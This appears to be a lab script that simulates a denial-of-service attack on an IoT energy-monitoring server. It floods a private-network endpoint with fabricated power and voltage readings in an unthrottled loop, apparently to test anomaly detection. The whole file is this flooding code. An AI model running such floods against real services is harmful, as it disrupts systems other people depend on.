import requests
import random
import time
import json

SERVER_URL = "http://192.168.200.84:3005/data"  # Replace with your server IP
DEVICE_ID = "Device_Attack"

# Based on previous outputs where data was flagged as DDOS attack, extract
# and define these parameters to generate the attack
POWER_RANGE = (50, 61) # Power value ranges where it was detected. This may need to be adjusted
VOLTAGE_RANGE = (219, 220) # Votalge values where it was detected.

def generate_attack_data():
    """Generate DDoS attack data based on observed anomalies."""
    power_w = random.uniform(*POWER_RANGE)  #unpack power and voltage range
    voltage_v = random.uniform(*VOLTAGE_RANGE) # Same applied to voltage range
    current_a = power_w / voltage_v # Calculate current

    return {"device_id": DEVICE_ID, "power_w": power_w, "voltage_v": voltage_v, "current_a": current_a}

def send_attack_data():
    """Flood the server with attack data to simulate a DDoS."""
    while True:
        data = generate_attack_data()
        try:
            response = requests.post(SERVER_URL, json=data)
            print(f"🔥 DDOS ATTACK SENT: {data} | Response: {response.status_code}")
        except Exception as e:
            print(f"❌ Error: {e}")
        # Reduce sleep even more to cause high frequency attacks.
        time.sleep(0.0001)  # Reduced sleep for increased request rate

if __name__ == "__main__":
    print("🚨 DDoS Attack Simulator Running...")
    send_attack_data()